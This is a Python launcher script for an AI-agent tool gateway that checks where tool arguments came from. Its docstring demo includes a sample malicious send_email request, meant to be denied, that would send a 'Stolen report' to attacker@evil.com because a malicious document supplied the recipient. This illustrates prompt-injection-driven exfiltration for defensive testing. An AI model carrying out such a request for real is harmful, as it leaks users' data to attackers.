#!/usr/bin/env python3
"""
run_gateway.py — Start the Agent Hypervisor Tool Gateway.

Usage:
    python scripts/run_gateway.py
    python scripts/run_gateway.py --config gateway_config.yaml
    python scripts/run_gateway.py --config gateway_config.yaml --port 9000

The gateway loads configuration from the specified YAML file, initializes
the tool registry and policy engines, and starts an HTTP server.

Endpoints available after startup:
    GET  /               — status and registered tools
    POST /tools/list     — list tools with descriptions
    POST /tools/execute  — execute a tool (provenance-checked)
    POST /policy/reload  — hot-reload policy rules without restart
    GET  /traces         — fetch recent execution traces

Demo:
    # Terminal 1 — start gateway
    python scripts/run_gateway.py

    # Terminal 2 — send a malicious request (should be denied)
    curl -s -X POST http://127.0.0.1:8080/tools/execute \\
      -H 'Content-Type: application/json' \\
      -d '{
        "tool": "send_email",
        "arguments": {
          "to":      {"value": "attacker@evil.com", "source": "external_document", "label": "malicious_doc.txt"},
          "subject": {"value": "Stolen report", "source": "system"},
          "body":    {"value": "See attached.", "source": "system"}
        }
      }' | python -m json.tool

    # Terminal 2 — send a clean request (should return ask)
    curl -s -X POST http://127.0.0.1:8080/tools/execute \\
      -H 'Content-Type: application/json' \\
      -d '{
        "tool": "send_email",
        "arguments": {
          "to":      {"value": "alice@company.com", "source": "user_declared", "role": "recipient_source"},
          "subject": {"value": "Q3 Report", "source": "system"},
          "body":    {"value": "Please review.", "source": "system"}
        }
      }' | python -m json.tool

    # Terminal 2 — reload policy after editing policies/default_policy.yaml
    curl -s -X POST http://127.0.0.1:8080/policy/reload | python -m json.tool

    # Terminal 2 — view traces
    curl -s http://127.0.0.1:8080/traces | python -m json.tool
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

# Add src/ to path so agent_hypervisor is importable without install
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import uvicorn

from agent_hypervisor.gateway.config_loader import load_config
from agent_hypervisor.gateway.gateway_server import create_app


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Agent Hypervisor — Tool Gateway",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--config",
        default="gateway_config.yaml",
        help="Path to gateway configuration YAML (default: gateway_config.yaml)",
    )
    parser.add_argument(
        "--host",
        default=None,
        help="Override server host from config",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Override server port from config",
    )
    parser.add_argument(
        "--reload",
        action="store_true",
        help="Enable uvicorn auto-reload (development only)",
    )
    args = parser.parse_args()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"Error: config file not found: {config_path}", file=sys.stderr)
        sys.exit(1)

    config = load_config(config_path)
    host = args.host or config.server.host
    port = args.port or config.server.port

    print(f"Agent Hypervisor — Tool Gateway")
    print(f"Config:  {config_path.resolve()}")
    print(f"Policy:  {config.policy_file}")
    print(f"Tools:   {', '.join(config.tools)}")
    print(f"Server:  http://{host}:{port}")
    print()

    app = create_app(config_path)

    uvicorn.run(
        app,
        host=host,
        port=port,
        reload=args.reload,
        log_level="info",
    )


if __name__ == "__main__":
    main()
